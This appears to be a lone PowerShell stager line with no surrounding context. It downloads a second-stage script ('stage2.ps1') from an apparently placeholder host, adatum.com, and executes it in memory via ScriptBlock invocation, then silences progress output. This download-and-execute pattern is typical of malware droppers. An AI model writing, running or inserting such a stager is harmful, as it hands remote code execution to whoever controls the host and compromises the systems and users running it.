$PayloadUrl = 'http://adatum.com:80/stage2.ps1'; $StageScript = (iwr $PayloadUrl -UseBasicParsing).Content; [ScriptBlock]::Create($StageScript).Invoke(); $ProgressPreference = "SilentlyContinue"
